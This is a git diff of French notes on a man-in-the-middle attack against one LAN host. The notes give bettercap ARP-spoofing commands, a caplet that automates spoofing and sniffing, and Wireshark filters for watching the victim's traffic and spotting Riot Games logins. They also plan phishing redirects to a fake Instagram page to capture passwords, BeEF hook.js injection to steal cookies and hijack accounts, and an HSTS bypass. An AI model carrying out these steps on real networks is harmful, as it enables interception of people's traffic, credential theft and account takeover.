@@ -681,6 +681,11 @@ sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 
 ==> Le trafic doit fonctionner correctement même si tout passe par la machine attaquante
 
+dans Wireshark, filtre : 
+- ip.addr == 192.168.1.161
+- clic droit>Follox>TCP stram ==> tout est chiffré
+- ip.addr == 192.168.1.161 && http
+
 ### d. with bettercap
 
 ````
@@ -699,38 +704,56 @@ events.ignore net.sniff.dns
 ````
 nous on veut que net.sniff.https et http
 
+[simple tutoriel for arp spoofing](https://www.geeksforgeeks.org/sniffing-using-bettercap-in-linux/)
+[Other simple tutorial same](https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/7-Sniffing/1-MITM-with-Bettercap.md)
+[doc officielle bettercap](https://www.bettercap.org/intro/)
 
 
+## 2. Voir le traffic, quels sites HTTP & HTTPS il consulte et repérer l'authentification à Riot Games
 
 
+### a. Repérer automatiquement l'authentification à Riot Games
 
+On filtre bien dans bettercap pour avoir que les requêtes https & http
+```
+events.ignore net.sniff.upnp
+events.ignore net.sniff.mdns
+events.ignore net.sniff.dns
+```
+==> Et là on repère dès que y a une requête authenticate.riotgames.com
 
+Automatiser bettercap en utilisant les caplets :
 
+```
+touch spoof.cap //on crée le caplet
+vim spoof.cap //add toutes les commandes dedans :
+> net.probe on
+> set arp.spoof.fullduplex true
+> set arp.spoof.targets 192.168.1.161
+> arp.spoof on // show : arp spoofer started, probing 1 targets
+> set net.sniff.local true
+> net.sniff on
 
+bettercap -iface eth0 -caplet spoof.cap // Start the Bettercap using the spoof Caplet that you created
+```
 
+### b. Rediriger vers le site que je veux
 
-
-----------
-----------
-
-
-
-## 2. Voir le traffic, quels sites HTTP & HTTPS il consulte
-
---> démarré le script python
---> check que c'est en place, arp -a, et voir si on a bien l'addr MAC de l'attaquant associé à l'IP du routeur
-dans Wireshark, filtre : ip.addr == 192.168.1.161
-clic droit>Follox>TCP stram ==> tout est chiffré 
-
- ip.addr == 192.168.1.161 && http
-
-
-
-## 3. Réussir à le rediriger vers le site que je veux
-
-On pourraît ajouter hook.js dans toutes les pages http demandées. Et alors en récuperant le cookie avec get cookie, on pourraît se connecter avec le compte de la victime sur tous les sites http. Mais ce qui serait encore mieux, serait de réussir à rediriger la victime vers un autre site que celui demandé. 
+Réussir à rediriger la victime vers un autre site que celui demandé :
 - par exemple il demande instagram.com ==> je le redirige vers une fausse page instagram que je crée, et là, je récupère ses id/mdp
 - dès que je remarque qu'il joue à lol ==> je le redirige vers une page que j'ai crée avec beef xss dedans et je bloque la fenetre avec une pop-up avec écrit "Arrête de jouer à LoL"
+
+
+### c. Possibilité d'ajouter hook.js dans tous les sites Http ? + https ?
+
+On pourraît ajouter hook.js dans toutes les pages http demandées. Et alors en récuperant le cookie avec get cookie de beef-xss, on pourraît se connecter avec le compte de la victime sur tous les sites http. 
+
+- script python qui permet de modif page html et add hook.js pour http possible
+- voir pour https si possible ? Bypass the HSTS (HTTP Strict Transport Security). You can perform this technique using Bettercap and hstshijack caplet
+
+
+
+
 
 
 
